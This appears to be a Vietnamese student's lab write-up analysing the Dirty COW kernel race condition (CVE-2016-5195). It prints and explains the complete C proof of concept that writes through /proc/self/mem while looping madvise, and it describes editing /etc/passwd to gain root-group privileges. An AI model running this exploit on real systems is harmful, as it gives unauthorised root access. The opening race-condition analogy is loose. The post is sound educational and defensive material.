# CVE-2016-5195(Dirty Cow)
### Cow là *copy-on-write*, xuất hiện trên các Linux Kernel từ năm 2007 và phát hiện năm 2016. Vì đang làm một bài lab liên quan đến con CVE này nên mình sẽ tranh thủ viết một bài phân tích về nó luôn.
## 1. Mở đầu
Vì kernel chạy dưới quyền root nên nó có thể bị khai thác như một lỗ hổng leo thang đặc quyền. Điều này có nghĩa là kẻ tấn công có thể  lợi dụng **Race condition** để giành được quyền root bằng cách khai thác nó từ người dùng cấp thấp.
## 2. Vậy race condition là gì?
Như trong môn lý thuyết hệ điều hành mình vừa học thì **Race condition** xảy ra khi hai hoặc nhiều tiến trình cùng truy cập vào một tài nguyên và thực hiện các thao tác trên tài nguyên đó mà không được đồng bộ hóa đúng cách. Khi đó, kết quả của các thao tác này có thể không đúng hoặc không như mong đợi.

Để dễ hiểu hơn thì ta tới một ví dụ đơn giản:

```
a = "h1n4m";   # ta gán cho a một chuỗi 
b = a;         # gán tiếp cho b = a
```

Ở đây mặc dù chúng ta có 2 biến, nhưng cả hai đều trỏ tới cùng một đối tượng bộ nhớ. Đây là một cơ chế của hệ điều hành vì không cần thiết phải chiếm gấp đôi dung lượng bộ nhớ cho các giá trị giống hệt nhau. HĐH sẽ đợi cho đến khi bản sao được sửa đổi, đó là lúc nó sẽ phân bổ bộ nhớ riêng cho biến còn lại.
```
b += "dep trai vcl"   # sử đổi giá trị biến b, cụ thể là thêm một chuỗi nối vào sau
```
Tại thời điểm này, HĐH sẽ thực hiện những việc sau:
1. Cấp phát bộ nhớ cho biến được sửa đổi mới.
2. Đọc nội dung gốc của đối tượng được sao chép.
3. Thực hiện bất kỳ thay đổi cần thiết nào đối với nó, tức là thêm "dep trai vcl".
4. Ghi nội dung đã sửa đổi vào không gian bộ nhớ mới được phân bổ.

Condition xảy ra ở giữa bươc 2 và bước 4, đánh lừa memory mapping ghi nội dung đã sửa đổi vào không gian bộ nhớ ban đầu thay vì không gian mới được phân bổ. Điều này khiến chúng ta phải sửa đổi bộ nhớ thuộc về `a`, tức là đối tượng ban đầu thay vì `b`, ngay cả khi chúng ta chỉ có đặc quyền chỉ đọc trên a.

## 3. Dirty cow

Bây giờ là phần chính, vậy ý tưởng để exploit là gì? Như chúng ta đã biết thì quyền hạn của một user được xác định trong file **/etc/passwd** và chỉ có root mới có thể sửa file này. Vậy liệu chúng ta có thể lợi dụng Race condition để thay đổi nội dung file **/etc/passwd** từ một user chỉ có quyền đọc hay không?

**Câu trả lời là có**, trước hết ta sẽ phân tích code exploit áp dụng cho một ví dụ đơn giản hơn:
![Nguồn: https://tsitsiflora.medium.com/dirty-cow-vulnerability-an-analysis-fdf50243dc6](https://miro.medium.com/v2/resize:fit:4800/format:webp/0*GTEdz7LqQNehteo2.png "https://tsitsiflora.medium.com/dirty-cow-vulnerability-an-analysis-fdf50243dc6")

Đầu tiên, ta tạo một file dirtycow có quyền 644 (chỉ **root** mới có quyền write). Ta thấy khi ghi "Hello" và file thì đã bị **Permission denied**.

Vậy là đối tượng tấn công đã chuẩn bị xong, giờ đến code exploit:

```#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
    pthread_t pth1,pth2;
    struct stat st;
    int file_size;

    int f=open("dirtycow", O_RDONLY);

    fstat(f, &st);
    file_size = st.st_size;
    map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

    char *position = strstr(map,"h1n4m");                        

    pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
    pthread_create(&pth2, NULL, writeThread, position);             

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    return 0;
}
```
Khai thác này được tạo thành từ ba luồng: luồng chính, luồng writeThread và luồng madvise. 

Luồng chính có chức năng ánh xạ tệp của chúng ta vào bộ nhớ:
```
    // Trước tiên chúng ta mở tệp của mình (lưu ý rằng nó đang được mở ở chế độ chỉ đọc) 
    int f=open("dirtycow", O_RDONLY);

    // Sau đó chúng ta map nó vào COW memory bằng MAP PRIVATE
    fstat(f, &st);
    file_size = st.st_size;
    map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
```
Tìm vị trí của mẫu cần thay thế:
```
    // Sử dụng hàm strstr để tìm vị trí của "h1n4m" trong bộ nhớ được ánh xạ 
    char *position = strstr(map,"h1n4m");
```
Sau đó chúng ta bắt đầu hai luồng, writeThread và madviseThread.
```
pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
    pthread_create(&pth2, NULL, writeThread, position);             

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
```

**writeThread**:
```
    void *writeThread(void *arg)
    {
        char *content= "h4ck3r";
        off_t offset = (off_t) arg;
    
        int f=open("/proc/self/mem", O_RDWR);
        while(1) {
            // Đưa con trỏ đến chính xác vị trí cần thay đổi
            lseek(f, offset, SEEK_SET);
            // Thay đổi trên memory
            write(f, content, strlen(content));
        }
    }
```
Công việc của thread này là thay thế chuỗi `h1n4m` thành `h4ck3r` (hoặc bất cứ thứ gì bạn muốn :> nguy hiểm chưa), nhưng vì map memory là loại copy-on-write nên thread này chỉ có thể sửa nội dung trên bản sao của map memory và không gây ra bất kì sự thay đổi nào trên file??

Vậy thì nguy hiểm chỗ nào? Thì ta sẽ xem tiếp thread còn lại.

**madviseThread**
```
    void *madviseThread(void *arg)
    {
        int file_size = (int) arg;
        while(1){
            madvise(map, file_size, MADV_DONTNEED);
        }
    }
```
Thread này chỉ thực hiện một công việc là xóa bỏ bản sao của map memory, vì thế con trỏ có khả năng trỏ lại map memory gốc hay bộ nhớ được ánh xạ ban đầu.

Nếu hai thread này thực hiện tuần tự, tức là non-multithread, thì sự thay đổi luôn luôn chỉ ảnh hưởng lên bản sao của map memory mà không gây nguy hiểm gì cho tập tin đã phân quyền của chúng ta. Nhưng nếu hai thread này được hệ thống gọi đồng thời, hay multithread thì chuyện gì sẽ xảy ra? **Chính xác**, là Race condition. Sẽ có lúc hệ thống lầm tưởng và trỏ con trỏ vào chính map memory ban đầu và sửa dữ liệu trên file của root dù không có quyền write. Nhưng không phải lúc nào hệ điều hành cũng sai lầm như thế nên chạy hai luồng trong một vòng lặp vô hạn, chỉ cần hệ thống nhầm lẫn một lần thôi thì mọi chuyện đã đúng như chúng ta tính toán.

## Let's exploit
Quay lại vấn đề chính, file **/etc/passwd** là file chỉ có root mới có quyền sửa, chúng ta cần vận dụng những kiến thức trên để sửa được group của lowuser trong file **/etc/passwd**

- PoC
![](poc1.png)
Khi là lower user ta không có quyền write đối với file dirtycow.
![](poc2.png)
Lowuser đã được lên chung group với root (1001->0000)

## 4. Tổng kết

Qua bài phân tích này mình đã giới thiệu cho các bạn về CVE-2016-5195 mang tên "Con bò dơ bẩn", ngoài việc sửa đổi group thì chúng ta hoàn toàn có thê thêm hẳn một user vào hệ thống luôn, cách làm vẫn như thế thôi. Dù quả cve này đã ra đời rất lâu rồi nhưng đến nay vẫn còn nhiều hệ thống sử dụng kernel cũ vẫn bị. Hi vọng qua bài viết các bạn có thể hiểu khái quát về cve cũng như cách phòng tránh cho chính hệ thống của bạn. ( cập nhật kernel đê !!!!!)

*Và mình là h1n4m. Peaceeeee.*
